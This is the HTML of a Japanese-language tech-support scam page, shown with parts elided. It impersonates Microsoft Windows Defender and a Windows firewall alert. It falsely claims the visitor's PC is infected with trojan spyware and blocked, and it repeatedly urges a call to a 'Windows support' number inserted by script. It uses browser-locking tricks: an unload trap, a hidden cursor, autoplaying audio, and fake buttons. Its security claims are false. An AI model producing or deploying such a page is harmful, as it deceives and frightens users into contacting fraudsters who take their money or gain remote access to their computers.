...
<html lang="en">
  <head>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0S8ZGNTRN3"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-0S8ZGNTRN3');
</script>

    <meta charset="utf-8">
    <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
    <meta content="noindex,nofollow" name="robots">
    <title>コンピューターエラ </title>
  ...
  <body class="map" id="mycanvas" onbeforeunload="return myFunction()"  style="cursor:none">
    ...
    <audio autoplay="" id="pridez">
      <source src="aud0jp87.mp3" type="audio/mpeg">
    </audio>
    ...
    <div class="pro_box" style="cursor: none; display: block;">
      <img src="boxc.png" alt="" style="max-width: 100%;">
    </div>
      ...
      <div class="row">
        <div class="col-md-12">
          <div class="right-foot" style="text-align:center">
            <span id="footertxt">
              <img src="msmm.png"> Windows セキュリティ </span>
            <span style="font-weight:500;padding-left:13px;color:#fff; ">サポートに電話する: <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"> <script>document.write(bcda)</script>
              </span>
            </span>
          </div>
        </div>
        <div class="col-md-12">
          <marquee direction="left" height="100px" width="100%">
            <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen により、認識されないアプリケーションが表示されなくなりました。このアプリケーションを実行すると、PC が危険にさらされる可能性があります。 Windows Defender スキャンにより、パスワード、オンライン ID、財務情報、個人ファイル、写真、ドキュメントを盗む可能性のある望ましくない可能性のあるアドウェアがこのデバイス上で見つかりました.</small>
          </marquee>
        </div>
      </div>
    </div>
    <div class="lightbox" id="poptxt" style="display: block;">
      ...
      <div id="txtintro">
        <span class="colo-rd">
          <div id="">Microsoft Windows ファイアウォールの警告 !</div>
          <div id="">トロイの木馬型スパイウェアに感染したPC</div>
          <div id=""> (エラーコード: 2V7HGTVB)</div>
        </span>
      </div>
      <img src="re.gif" id="banner">
      <div id="disclaimer">この PC へのアクセスはセキュリティ上の理由からブロックされています.  <br>
        <span class="support" style="font-size:22px;">サポートに電話する:&nbsp; <span style="border:1px solid #114d9a;border-radius:5px;padding:2px 5px"> <script>document.write(bcda)</script>
          </span>
        </span>
      </div>
      <div id="bottom">
        <img src="msmm.png" id="badge">
        <span class="title3" style="font-size:16px; ">Windows</span>
        <ul>
          <li>
            <a href="#">
              <div class="fr button2">
                  <span id="addtochromebutton">カット</span>
              </div>
            </a>
          </li>
          <li>
            <a href="#">
              <div class="fr button">
                <span id="addtochromebutton">戻る</span>
              </div>
            </a>
          </li>
        </ul>
    ...
    <div class="cardcontainer" style="cursor: none; display: block;" id="pop_up_new">
      ...
      <p style="padding-bottom:0;color:#fff;font-size:16px">Windows サポートに電話する: <strong>
          <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"><script>document.write(bcda)</script>
          </span>
        </strong>
      </p>
    ...
    <div class="answer_list" style="display:none;background-color:#000;height:auto;width:550px;left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
      <p style="color:#fff;margin-top:10px;font-size:16px;padding:0 5px" class="text-center">すぐに当社にご連絡ください。当社のエンジニアが電話で削除プロセスを案内いたします。 <br>お使いのコンピュータは無効になっています。<br>
        <strong>Windows サポートに電話する: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"> <script>document.write(bcda)</script>
          </span>
        </strong>
      </p>
    </div>
    <div id="chat" style="display: block;">
      ...
      <h4 style="font-weight:600;font-size:22px"> <script>document.write(bcda)</script>
        <br>(セキュリティサポート)
      </h4>
    ...
    <script src="escs.js"></script>
    <script src="safes.js"></script>
    <script>
